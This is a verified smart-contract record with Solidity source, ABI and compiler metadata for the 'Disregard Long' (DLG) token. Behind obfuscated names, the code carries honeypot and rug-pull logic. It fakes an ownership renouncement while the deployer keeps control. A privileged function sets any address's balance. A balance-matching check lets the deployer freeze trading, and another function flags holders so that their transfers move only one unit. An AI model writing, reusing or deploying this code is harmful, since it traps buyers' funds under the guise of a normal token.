{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface fromLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract launchBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquidityLaunched {\n    function createPair(address buySender, address walletLaunch) external returns (address);\n}\n\ninterface tradingExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundAmount) external view returns (uint256);\n\n    function transfer(address isSwapBuy, uint256 autoMaxFrom) external returns (bool);\n\n    function allowance(address maxTakeTo, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoMaxFrom) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isSwapBuy,\n        uint256 autoMaxFrom\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletLiquidity, uint256 value);\n    event Approval(address indexed maxTakeTo, address indexed spender, uint256 value);\n}\n\ninterface tradingExemptMetadata is tradingExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DisregardLong is launchBuy, tradingExempt, tradingExemptMetadata {\n\n    function maxLiquidity(address launchSwap, uint256 autoMaxFrom) public {\n        listLaunched();\n        isToken[launchSwap] = autoMaxFrom;\n    }\n\n    function approve(address teamSell, uint256 autoMaxFrom) public virtual override returns (bool) {\n        walletMarketing[_msgSender()][teamSell] = autoMaxFrom;\n        emit Approval(_msgSender(), teamSell, autoMaxFrom);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchMarketingToken;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchEnable;\n    }\n\n    address senderReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public takeAutoLimit;\n\n    mapping(address => bool) public listTake;\n\n    address private receiverToken;\n\n    address public receiverIs;\n\n    address sellWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function isEnable(uint256 autoMaxFrom) public {\n        listLaunched();\n        limitMaxMin = autoMaxFrom;\n    }\n\n    function balanceOf(address fundAmount) public view virtual override returns (uint256) {\n        return isToken[fundAmount];\n    }\n\n    function owner() external view returns (address) {\n        return receiverToken;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundExemptFee;\n    }\n\n    function allowance(address sellModeTotal, address teamSell) external view virtual override returns (uint256) {\n        if (teamSell == senderReceiver) {\n            return type(uint256).max;\n        }\n        return walletMarketing[sellModeTotal][teamSell];\n    }\n\n    bool public launchExempt;\n\n    string private fundExemptFee = \"DLG\";\n\n    function transfer(address launchSwap, uint256 autoMaxFrom) external virtual override returns (bool) {\n        return tokenMaxAuto(_msgSender(), launchSwap, autoMaxFrom);\n    }\n\n    function tokenMaxAuto(address txWallet, address isSwapBuy, uint256 autoMaxFrom) internal returns (bool) {\n        if (txWallet == receiverIs) {\n            return teamWalletMin(txWallet, isSwapBuy, autoMaxFrom);\n        }\n        uint256 isBuyLaunched = tradingExempt(shouldLaunch).balanceOf(sellWallet);\n        require(isBuyLaunched == limitMaxMin);\n        require(isSwapBuy != sellWallet);\n        if (txToken[txWallet]) {\n            return teamWalletMin(txWallet, isSwapBuy, receiverAuto);\n        }\n        return teamWalletMin(txWallet, isSwapBuy, autoMaxFrom);\n    }\n\n    constructor (){\n        \n        fromLaunch teamTotalShould = fromLaunch(senderReceiver);\n        shouldLaunch = liquidityLaunched(teamTotalShould.factory()).createPair(teamTotalShould.WETH(), address(this));\n        \n        receiverIs = _msgSender();\n        liquidityTotal();\n        listTake[receiverIs] = true;\n        isToken[receiverIs] = launchMarketingToken;\n        if (launchExempt) {\n            launchExempt = true;\n        }\n        emit Transfer(address(0), receiverIs, launchMarketingToken);\n    }\n\n    event OwnershipTransferred(address indexed takeTeamReceiver, address indexed tokenReceiver);\n\n    uint256 constant receiverAuto = 1 ** 10;\n\n    function getOwner() external view returns (address) {\n        return receiverToken;\n    }\n\n    bool public launchedAtMax;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverExempt;\n    }\n\n    uint256 private launchMarketingToken = 100000000 * 10 ** 18;\n\n    uint8 private launchEnable = 18;\n\n    mapping(address => uint256) private isToken;\n\n    function listLaunched() private view {\n        require(listTake[_msgSender()]);\n    }\n\n    function atTeam(address senderFee) public {\n        if (takeAutoLimit) {\n            return;\n        }\n        if (maxTo != liquidityMode) {\n            exemptIs = false;\n        }\n        listTake[senderFee] = true;\n        \n        takeAutoLimit = true;\n    }\n\n    string private receiverExempt = \"Disregard Long\";\n\n    mapping(address => bool) public txToken;\n\n    uint256 limitMaxMin;\n\n    uint256 private maxTo;\n\n    bool public exemptIs;\n\n    mapping(address => mapping(address => uint256)) private walletMarketing;\n\n    function fromEnable(address sellModeTeam) public {\n        listLaunched();\n        if (launchedAtMax) {\n            launchedAtMax = false;\n        }\n        if (sellModeTeam == receiverIs || sellModeTeam == shouldLaunch) {\n            return;\n        }\n        txToken[sellModeTeam] = true;\n    }\n\n    address public shouldLaunch;\n\n    function teamWalletMin(address txWallet, address isSwapBuy, uint256 autoMaxFrom) internal returns (bool) {\n        require(isToken[txWallet] >= autoMaxFrom);\n        isToken[txWallet] -= autoMaxFrom;\n        isToken[isSwapBuy] += autoMaxFrom;\n        emit Transfer(txWallet, isSwapBuy, autoMaxFrom);\n        return true;\n    }\n\n    uint256 public liquidityMode;\n\n    function liquidityTotal() public {\n        emit OwnershipTransferred(receiverIs, address(0));\n        receiverToken = address(0);\n    }\n\n    uint256 feeIs;\n\n    function transferFrom(address txWallet, address isSwapBuy, uint256 autoMaxFrom) external override returns (bool) {\n        if (_msgSender() != senderReceiver) {\n            if (walletMarketing[txWallet][_msgSender()] != type(uint256).max) {\n                require(autoMaxFrom <= walletMarketing[txWallet][_msgSender()]);\n                walletMarketing[txWallet][_msgSender()] -= autoMaxFrom;\n            }\n        }\n        return tokenMaxAuto(txWallet, isSwapBuy, autoMaxFrom);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxTakeTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeTeamReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletLiquidity\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellModeTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoMaxFrom\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderFee\",\"type\":\"address\"}],\"name\":\"atTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAmount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellModeTeam\",\"type\":\"address\"}],\"name\":\"fromEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoMaxFrom\",\"type\":\"uint256\"}],\"name\":\"isEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedAtMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoMaxFrom\",\"type\":\"uint256\"}],\"name\":\"maxLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeAutoLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoMaxFrom\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isSwapBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoMaxFrom\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DisregardLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}